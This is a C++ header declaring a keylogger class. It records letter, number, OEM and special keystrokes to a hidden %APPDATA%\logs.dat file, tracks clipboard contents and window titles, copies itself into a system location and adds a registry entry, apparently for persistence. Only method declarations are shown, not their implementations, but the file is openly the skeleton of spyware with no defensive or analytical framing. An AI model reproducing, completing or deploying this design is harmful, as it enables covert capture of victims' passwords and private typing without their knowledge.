#pragma once
#pragma warning(disable : 4996)
#include <fstream>
#include <string>

using std::fstream;

class KeyLogger
{
private:
	fstream logs, clip;
	std::string fromPath;
	const std::string SystemPath = getenv("APPDATA");
	const std::string LogPath = getenv("APPDATA") + std::string("\\logs.dat");
	char key;
	int temp;
	int sKey, oKey;
public:
	KeyLogger();
	~KeyLogger();
	char ChangeKeyToXChar(int key);
	//void ReadingKey(fstream & fs);
	//void ReadingSpecialKeys(int key, fstream & fs);
	std::string GetWindowTitle();
	void CopyToSys(std::string fp);
	void AddREG();
	void AZkeys(fstream &fs);
	void NUMkeys(fstream &fs);
	void OEMkeys(fstream &fs);
	void SpecialKeys(fstream &fs);
};

